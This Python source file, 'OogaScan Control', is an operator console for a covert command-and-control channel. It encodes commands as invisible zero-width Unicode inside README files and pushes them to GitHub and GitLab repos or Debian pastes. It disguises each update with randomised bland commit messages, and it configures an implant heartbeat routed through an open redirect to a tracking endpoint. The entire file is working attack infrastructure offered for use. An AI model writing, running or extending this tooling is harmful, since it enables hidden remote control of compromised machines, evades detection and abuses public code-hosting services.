#!/usr/bin/env python3
"""
OogaScan Control — Operator tool for managing GitHub/GitLab dead-drop C2.

Encodes commands into invisible zero-width Unicode inside README files.
Pushes updates via GitHub/GitLab API. Manages repo lists and heartbeat config.
"""

import os
import sys
import json
import base64
import random
import urllib.request
import urllib.error
import urllib.parse
from pathlib import Path
from dataclasses import dataclass, field

import zwenc

CONTROL_CONFIG = str(Path(__file__).parent / "control_config.json")

BLAND_COMMITS = [
    "Update README.md",
    "docs: update readme",
    "fix typo in readme",
    "docs: minor update",
    "update documentation",
    "readme: fix formatting",
    "docs: clarify instructions",
    "update project description",
]


class C:
    CYAN    = "\033[1;36m"
    GREEN   = "\033[1;32m"
    RED     = "\033[1;31m"
    YELLOW  = "\033[1;33m"
    PURPLE  = "\033[1;35m"
    BOLD    = "\033[1m"
    DIM     = "\033[2m"
    RESET   = "\033[0m"

BANNER = f"""{C.CYAN}
  ╔═══════════════════════════════════════════════════╗
  ║  OogaScan Control — Zero-Width Dead-Drop Manager  ║
  ╚═══════════════════════════════════════════════════╝
{C.RESET}"""


@dataclass
class RepoTarget:
    owner: str
    repo: str
    platform: str = "github"
    branch: str = "main"
    file_path: str = "README.md"
    alive: bool = True


@dataclass
class ControlConfig:
    github_token: str = ""
    gitlab_token: str = ""
    repos: list = field(default_factory=list)
    commands: list = field(default_factory=list)
    heartbeat_redirect: str = ""
    heartbeat_tracking: str = ""
    heartbeat_interval: int = 300

    def save(self, path: str = CONTROL_CONFIG):
        data = {
            "github_token": self.github_token,
            "gitlab_token": self.gitlab_token,
            "repos": [
                {"owner": r.owner, "repo": r.repo, "platform": r.platform,
                 "branch": r.branch, "file_path": r.file_path}
                for r in self.repos
            ],
            "commands": self.commands,
            "heartbeat_redirect": self.heartbeat_redirect,
            "heartbeat_tracking": self.heartbeat_tracking,
            "heartbeat_interval": self.heartbeat_interval,
        }
        Path(path).write_text(json.dumps(data, indent=2))

    @classmethod
    def load(cls, path: str = CONTROL_CONFIG):
        if not Path(path).exists():
            return cls()
        raw = json.loads(Path(path).read_text())
        repos = [RepoTarget(**r) for r in raw.get("repos", [])]
        return cls(
            github_token=raw.get("github_token", ""),
            gitlab_token=raw.get("gitlab_token", ""),
            repos=repos,
            commands=raw.get("commands", []),
            heartbeat_redirect=raw.get("heartbeat_redirect", ""),
            heartbeat_tracking=raw.get("heartbeat_tracking", ""),
            heartbeat_interval=raw.get("heartbeat_interval", 300),
        )


def _build_payload(config: ControlConfig) -> bytes:
    gh_repos = [f"{r.owner}/{r.repo}" for r in config.repos if r.platform == "github"]
    gl_repos = [f"{r.owner}/{r.repo}" for r in config.repos if r.platform == "gitlab"]
    dp_pastes = [r.repo for r in config.repos if r.platform == "debian"]

    payload = {
        "gh": gh_repos,
        "gl": gl_repos,
        "dp": dp_pastes,
        "cmd": config.commands,
    }

    if config.heartbeat_redirect and config.heartbeat_tracking:
        encoded_target = urllib.parse.quote(config.heartbeat_tracking, safe="")
        hb_url = config.heartbeat_redirect.replace("{target}", encoded_target)
        payload["hb"] = {"url": hb_url, "sec": config.heartbeat_interval}

    return json.dumps(payload, separators=(",", ":")).encode()


def debian_paste_create(content: str, poster: str = "anonymous", expire: str = "-1") -> str | None:
    data = urllib.parse.urlencode({
        "code": content,
        "poster": poster,
        "expire": expire,
    }).encode()
    req = urllib.request.Request(
        "https://paste.debian.net/",
        data=data,
        headers={"User-Agent": "Mozilla/5.0", "Content-Type": "application/x-www-form-urlencoded"},
    )
    try:
        with urllib.request.urlopen(req, timeout=20) as resp:
            url = resp.url
            if "/plain/" not in url and "paste.debian.net/" in url:
                paste_id = url.rstrip("/").split("/")[-1]
                return paste_id
    except Exception:
        pass
    return None


def _github_headers(token: str) -> dict:
    return {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json",
        "User-Agent": "Mozilla/5.0",
    }


def _gitlab_headers(token: str) -> dict:
    return {
        "PRIVATE-TOKEN": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0",
    }


def github_fetch_readme(repo: RepoTarget, token: str) -> tuple[str | None, str | None]:
    url = (f"https://api.github.com/repos/{repo.owner}/{repo.repo}"
           f"/contents/{urllib.parse.quote(repo.file_path)}?ref={repo.branch}")
    req = urllib.request.Request(url, headers=_github_headers(token))
    try:
        with urllib.request.urlopen(req, timeout=15) as resp:
            data = json.loads(resp.read())
            content = base64.b64decode(data["content"]).decode(errors="replace")
            sha = data["sha"]
            return content, sha
    except urllib.error.HTTPError as e:
        if e.code == 404:
            return None, None
        raise
    except Exception:
        return None, None


def github_push_readme(repo: RepoTarget, token: str, content: str, sha: str | None):
    url = (f"https://api.github.com/repos/{repo.owner}/{repo.repo}"
           f"/contents/{urllib.parse.quote(repo.file_path)}")
    body = {
        "message": random.choice(BLAND_COMMITS),
        "content": base64.b64encode(content.encode()).decode(),
        "branch": repo.branch,
    }
    if sha:
        body["sha"] = sha

    data = json.dumps(body).encode()
    req = urllib.request.Request(url, data=data, method="PUT",
                                headers=_github_headers(token))
    with urllib.request.urlopen(req, timeout=30) as resp:
        return resp.status in (200, 201)


def gitlab_fetch_readme(repo: RepoTarget, token: str) -> tuple[str | None, None]:
    project_id = urllib.parse.quote(f"{repo.owner}/{repo.repo}", safe="")
    file_path = urllib.parse.quote(repo.file_path, safe="")
    url = (f"https://gitlab.com/api/v4/projects/{project_id}"
           f"/repository/files/{file_path}?ref={repo.branch}")
    req = urllib.request.Request(url, headers=_gitlab_headers(token))
    try:
        with urllib.request.urlopen(req, timeout=15) as resp:
            data = json.loads(resp.read())
            content = base64.b64decode(data["content"]).decode(errors="replace")
            return content, None
    except urllib.error.HTTPError as e:
        if e.code == 404:
            return None, None
        raise
    except Exception:
        return None, None


def gitlab_push_readme(repo: RepoTarget, token: str, content: str):
    project_id = urllib.parse.quote(f"{repo.owner}/{repo.repo}", safe="")
    file_path = urllib.parse.quote(repo.file_path, safe="")
    url = (f"https://gitlab.com/api/v4/projects/{project_id}"
           f"/repository/files/{file_path}")
    body = {
        "branch": repo.branch,
        "content": content,
        "commit_message": random.choice(BLAND_COMMITS),
        "encoding": "text",
    }
    data = json.dumps(body).encode()
    req = urllib.request.Request(url, data=data, method="PUT",
                                headers=_gitlab_headers(token))
    with urllib.request.urlopen(req, timeout=30) as resp:
        return resp.status == 200


def check_repo_alive(repo: RepoTarget) -> bool:
    if repo.platform == "debian":
        url = f"https://paste.debian.net/plain/{repo.repo}"
    elif repo.platform == "github":
        url = (f"https://raw.githubusercontent.com/{repo.owner}/{repo.repo}"
               f"/{repo.branch}/{repo.file_path}")
    else:
        url = (f"https://gitlab.com/{repo.owner}/{repo.repo}"
               f"/-/raw/{repo.branch}/{repo.file_path}")
    req = urllib.request.Request(url, method="HEAD",
                                headers={"User-Agent": "Mozilla/5.0"})
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            return resp.status == 200
    except urllib.error.HTTPError as e:
        return e.code != 404
    except Exception:
        return False


def push_to_repo(repo: RepoTarget, config: ControlConfig, payload: bytes, pad: bool = False) -> bool:
    try:
        if repo.platform == "debian":
            content = f"# Project\n\nRepository.\n"
            injected = zwenc.inject(content, payload, pad=pad)
            paste_id = debian_paste_create(injected)
            if paste_id:
                print(f"  {C.GREEN}New Debian paste: {paste_id}{C.RESET}")
                repo.repo = paste_id
                return True
            return False

        elif repo.platform == "github":
            if not config.github_token:
                print(f"  {C.RED}No GitHub token set{C.RESET}")
                return False
            content, sha = github_fetch_readme(repo, config.github_token)
            if content is None:
                content = f"# {repo.repo}\n\nProject repository.\n"
                sha = None
            injected = zwenc.inject(content, payload, pad=pad)
            github_push_readme(repo, config.github_token, injected, sha)
            return True

        elif repo.platform == "gitlab":
            if not config.gitlab_token:
                print(f"  {C.RED}No GitLab token set{C.RESET}")
                return False
            content, _ = gitlab_fetch_readme(repo, config.gitlab_token)
            if content is None:
                content = f"# {repo.repo}\n\nProject repository.\n"
            injected = zwenc.inject(content, payload, pad=pad)
            gitlab_push_readme(repo, config.gitlab_token, injected)
            return True

    except Exception as e:
        print(f"  {C.RED}Error: {e}{C.RESET}")
        return False


def pull_from_repo(repo: RepoTarget, config: ControlConfig) -> dict | None:
    try:
        if repo.platform == "debian":
            url = f"https://paste.debian.net/plain/{repo.repo}"
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=15) as resp:
                content = resp.read(1_048_576 * 2).decode(errors="replace")
        elif repo.platform == "github":
            if not config.github_token:
                return None
            content, _ = github_fetch_readme(repo, config.github_token)
        else:
            if not config.gitlab_token:
                return None
            content, _ = gitlab_fetch_readme(repo, config.gitlab_token)

        if content is None:
            return None

        raw = zwenc.extract(content)
        if raw is None:
            return None
        return json.loads(raw)

    except Exception:
        return None


def _parse_repo_str(s: str) -> RepoTarget:
    if s.startswith("dp:") or s.startswith("debian:"):
        paste_id = s.split(":", 1)[1].strip()
        return RepoTarget(owner="", repo=paste_id, platform="debian",
                          branch="", file_path="")

    plat = "github"
    branch = "main"
    file_path = "README.md"

    if s.startswith("gl:") or s.startswith("gitlab:"):
        plat = "gitlab"
        s = s.split(":", 1)[1]
    elif s.startswith("gh:") or s.startswith("github:"):
        plat = "github"
        s = s.split(":", 1)[1]

    if ":" in s:
        repo_part, rest = s.split(":", 1)
        if "/" in rest:
            branch, file_path = rest.split("/", 1)
        else:
            branch = rest
    else:
        repo_part = s

    parts = repo_part.split("/")
    if len(parts) != 2:
        raise ValueError(f"Invalid format: {s}")
    return RepoTarget(owner=parts[0], repo=parts[1], platform=plat,
                      branch=branch, file_path=file_path)


def _repo_label(r: RepoTarget) -> str:
    if r.platform == "debian":
        return f"[debian] paste:{r.repo}"
    return f"[{r.platform}] {r.owner}/{r.repo}"


HELP_TEXT = f"""
{C.BOLD}Repo Management:{C.RESET}
  {C.GREEN}add <[gh:|gl:|dp:]owner/repo[:branch]>{C.RESET} — Add target (dp: = Debian paste)
  {C.GREEN}rm <index>{C.RESET}                          — Remove repo by index
  {C.GREEN}repos{C.RESET}                               — List all repos
  {C.GREEN}check{C.RESET}                               — Check repos for 404

{C.BOLD}Commands:{C.RESET}
  {C.GREEN}cmd <command>{C.RESET}                       — Add command to payload
  {C.GREEN}cmds{C.RESET}                                — List current commands
  {C.GREEN}clear{C.RESET}                               — Clear all commands

{C.BOLD}Heartbeat:{C.RESET}
  {C.GREEN}hb_redirect <url_with_{{target}}>{C.RESET}    — Set open redirect URL
  {C.GREEN}hb_tracking <url_with_{{id}}>{C.RESET}       — Set tracking endpoint
  {C.GREEN}hb_interval <seconds>{C.RESET}               — Set heartbeat interval
  {C.GREEN}hb{C.RESET}                                  — Show heartbeat config

{C.BOLD}Tokens:{C.RESET}
  {C.GREEN}gh_token <token>{C.RESET}                    — Set GitHub token
  {C.GREEN}gl_token <token>{C.RESET}                    — Set GitLab token

{C.BOLD}Operations:{C.RESET}
  {C.GREEN}push{C.RESET}                                — Push payload to all repos
  {C.GREEN}push <index>{C.RESET}                        — Push to specific repo
  {C.GREEN}pad{C.RESET}                                 — Toggle 1MB ZW padding (current: off)
  {C.GREEN}pull <index>{C.RESET}                        — Read payload from repo
  {C.GREEN}preview{C.RESET}                             — Show payload JSON
  {C.GREEN}paste{C.RESET}                               — Create new Debian paste with payload
  {C.GREEN}save{C.RESET}                                — Save config to disk

{C.BOLD}Other:{C.RESET}
  {C.GREEN}help{C.RESET}                                — This help
  {C.GREEN}exit{C.RESET}                                — Quit
"""


def interactive_shell(config: ControlConfig):
    print(HELP_TEXT)
    use_pad = False

    while True:
        try:
            line = input(f"{C.BOLD}ctrl>{C.RESET} ").strip()
        except (EOFError, KeyboardInterrupt):
            print(f"\n{C.YELLOW}[*] Exiting...{C.RESET}")
            break

        if not line:
            continue

        parts = line.split(None, 1)
        action = parts[0].lower()
        arg = parts[1] if len(parts) > 1 else ""

        if action == "help":
            print(HELP_TEXT)

        elif action in ("exit", "quit"):
            break

        elif action == "add":
            if not arg:
                print(f"  {C.RED}Usage: add [gh:|gl:]owner/repo{C.RESET}")
                continue
            try:
                repo = _parse_repo_str(arg)
                config.repos.append(repo)
                print(f"  {C.GREEN}+ [{repo.platform}] {repo.owner}/{repo.repo}{C.RESET}")
            except ValueError as e:
                print(f"  {C.RED}{e}{C.RESET}")

        elif action == "rm":
            try:
                idx = int(arg) - 1
                removed = config.repos.pop(idx)
                print(f"  {C.YELLOW}- [{removed.platform}] {removed.owner}/{removed.repo}{C.RESET}")
            except (ValueError, IndexError):
                print(f"  {C.RED}Invalid index{C.RESET}")

        elif action == "repos":
            if not config.repos:
                print(f"  {C.DIM}(no repos){C.RESET}")
            else:
                for i, r in enumerate(config.repos):
                    status = f"{C.GREEN}OK{C.RESET}" if r.alive else f"{C.RED}404{C.RESET}"
                    if r.platform == "debian":
                        print(f"  {i+1}. [debian] paste:{r.repo} {status}")
                    else:
                        print(f"  {i+1}. [{r.platform}] {r.owner}/{r.repo}"
                              f":{r.branch}/{r.file_path} {status}")

        elif action == "check":
            print(f"  Checking {len(config.repos)} repos...")
            for r in config.repos:
                alive = check_repo_alive(r)
                r.alive = alive
                status = f"{C.GREEN}ALIVE{C.RESET}" if alive else f"{C.RED}404/DEAD{C.RESET}"
                label = f"paste:{r.repo}" if r.platform == "debian" else f"{r.owner}/{r.repo}"
                print(f"    [{r.platform}] {label} — {status}")

        elif action == "cmd":
            if not arg:
                print(f"  {C.RED}Usage: cmd <command>{C.RESET}")
                continue
            config.commands.append(arg)
            print(f"  {C.DIM}+ added ({len(config.commands)} total){C.RESET}")

        elif action == "cmds":
            if not config.commands:
                print(f"  {C.DIM}(no commands){C.RESET}")
            else:
                for i, cmd in enumerate(config.commands):
                    print(f"  {i+1}. {cmd}")

        elif action == "clear":
            config.commands.clear()
            print(f"  {C.DIM}Commands cleared{C.RESET}")

        elif action == "hb_redirect":
            config.heartbeat_redirect = arg
            print(f"  {C.GREEN}Redirect: {arg}{C.RESET}")

        elif action == "hb_tracking":
            config.heartbeat_tracking = arg
            print(f"  {C.GREEN}Tracking: {arg}{C.RESET}")

        elif action == "hb_interval":
            try:
                config.heartbeat_interval = max(30, int(arg))
                print(f"  {C.GREEN}Interval: {config.heartbeat_interval}s{C.RESET}")
            except ValueError:
                print(f"  {C.RED}Invalid number{C.RESET}")

        elif action == "hb":
            print(f"  Redirect: {config.heartbeat_redirect or '(not set)'}")
            print(f"  Tracking: {config.heartbeat_tracking or '(not set)'}")
            print(f"  Interval: {config.heartbeat_interval}s")
            if config.heartbeat_redirect and config.heartbeat_tracking:
                encoded = urllib.parse.quote(config.heartbeat_tracking, safe="")
                full = config.heartbeat_redirect.replace("{target}", encoded)
                print(f"  {C.DIM}Final URL: {full}{C.RESET}")

        elif action == "gh_token":
            config.github_token = arg
            print(f"  {C.GREEN}GitHub token set ({len(arg)} chars){C.RESET}")

        elif action == "gl_token":
            config.gitlab_token = arg
            print(f"  {C.GREEN}GitLab token set ({len(arg)} chars){C.RESET}")

        elif action == "preview":
            payload = _build_payload(config)
            print(f"  {C.DIM}{payload.decode()}{C.RESET}")
            print(f"  {C.DIM}({len(payload)} bytes → {len(payload)*4} ZW chars){C.RESET}")

        elif action == "pad":
            use_pad = not use_pad
            state = f"{C.GREEN}ON{C.RESET}" if use_pad else f"{C.RED}OFF{C.RESET}"
            print(f"  1MB ZW padding: {state}")

        elif action == "paste":
            payload = _build_payload(config)
            content = f"# Notes\n\nMiscellaneous.\n"
            injected = zwenc.inject(content, payload, pad=use_pad)
            print(f"  Creating Debian paste ({len(injected)} bytes)...")
            paste_id = debian_paste_create(injected)
            if paste_id:
                print(f"  {C.GREEN}Paste ID: {paste_id}{C.RESET}")
                print(f"  URL: https://paste.debian.net/{paste_id}")
                config.repos.append(RepoTarget(owner="", repo=paste_id,
                                               platform="debian", branch="", file_path=""))
            else:
                print(f"  {C.RED}Failed to create paste{C.RESET}")

        elif action == "push":
            payload = _build_payload(config)
            if arg:
                try:
                    idx = int(arg) - 1
                    r = config.repos[idx]
                    print(f"  Pushing to {_repo_label(r)}...")
                    ok = push_to_repo(r, config, payload, pad=use_pad)
                    if ok:
                        print(f"  {C.GREEN}[+] Pushed successfully{C.RESET}")
                    else:
                        print(f"  {C.RED}[-] Push failed{C.RESET}")
                except (ValueError, IndexError):
                    print(f"  {C.RED}Invalid index{C.RESET}")
            else:
                alive_repos = [r for r in config.repos if r.alive]
                if not alive_repos:
                    print(f"  {C.RED}No alive repos. Run 'check' first.{C.RESET}")
                    continue
                for r in alive_repos:
                    print(f"  Pushing to {_repo_label(r)}...", end=" ")
                    ok = push_to_repo(r, config, payload, pad=use_pad)
                    print(f"{C.GREEN}OK{C.RESET}" if ok else f"{C.RED}FAIL{C.RESET}")

        elif action == "pull":
            try:
                idx = int(arg) - 1
                r = config.repos[idx]
                print(f"  Pulling from {_repo_label(r)}...")
                data = pull_from_repo(r, config)
                if data:
                    print(f"  {C.GREEN}Payload:{C.RESET}")
                    print(f"  {json.dumps(data, indent=2)}")
                else:
                    print(f"  {C.RED}No payload found or repo unreachable{C.RESET}")
            except (ValueError, IndexError):
                print(f"  {C.RED}Invalid index{C.RESET}")

        elif action == "save":
            config.save()
            print(f"  {C.GREEN}Config saved to {CONTROL_CONFIG}{C.RESET}")

        else:
            print(f"  {C.RED}Unknown command. Type 'help'{C.RESET}")


def main():
    import argparse
    parser = argparse.ArgumentParser(
        description="OogaScan Control — Zero-Width Dead-Drop Manager",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""\
Interactive operator tool for managing GitHub/GitLab dead-drop C2.
Encodes commands in invisible zero-width Unicode within README files.

examples:
  %(prog)s
  %(prog)s -c my_config.json
  %(prog)s --push -r gh:user/repo -r gl:user/backup --cmd "shell whoami"
""",
    )
    parser.add_argument("-c", "--config", default=CONTROL_CONFIG, help="Config file")
    parser.add_argument("-r", "--repo", action="append", default=[],
                        help="Target repo ([gh:|gl:]owner/repo). Repeatable.")
    parser.add_argument("--cmd", action="append", default=[], help="Command to embed")
    parser.add_argument("--push", action="store_true", help="Push and exit (non-interactive)")
    parser.add_argument("--pad", action="store_true", help="Add 1MB ZW padding to payload")
    parser.add_argument("--check", action="store_true", help="Check repos and exit")
    args = parser.parse_args()

    config = ControlConfig.load(args.config)

    for r in args.repo:
        try:
            config.repos.append(_parse_repo_str(r))
        except ValueError as e:
            print(f"{C.RED}[!] {e}{C.RESET}")
            sys.exit(1)

    for cmd in args.cmd:
        config.commands.append(cmd)

    if args.check:
        print(BANNER)
        for r in config.repos:
            alive = check_repo_alive(r)
            r.alive = alive
            status = f"{C.GREEN}ALIVE{C.RESET}" if alive else f"{C.RED}404{C.RESET}"
            print(f"  {_repo_label(r)} — {status}")
        return

    if args.push:
        print(BANNER)
        if not config.repos:
            print(f"{C.RED}[!] No repos configured{C.RESET}")
            sys.exit(1)
        payload = _build_payload(config)
        print(f"[*] Payload: {len(payload)} bytes" +
              (f" + 1MB padding" if args.pad else ""))
        for r in config.repos:
            print(f"  Pushing to {_repo_label(r)}...", end=" ")
            ok = push_to_repo(r, config, payload, pad=args.pad)
            print(f"{C.GREEN}OK{C.RESET}" if ok else f"{C.RED}FAIL{C.RESET}")
        return

    print(BANNER)
    interactive_shell(config)
    config.save()


if __name__ == "__main__":
    main()
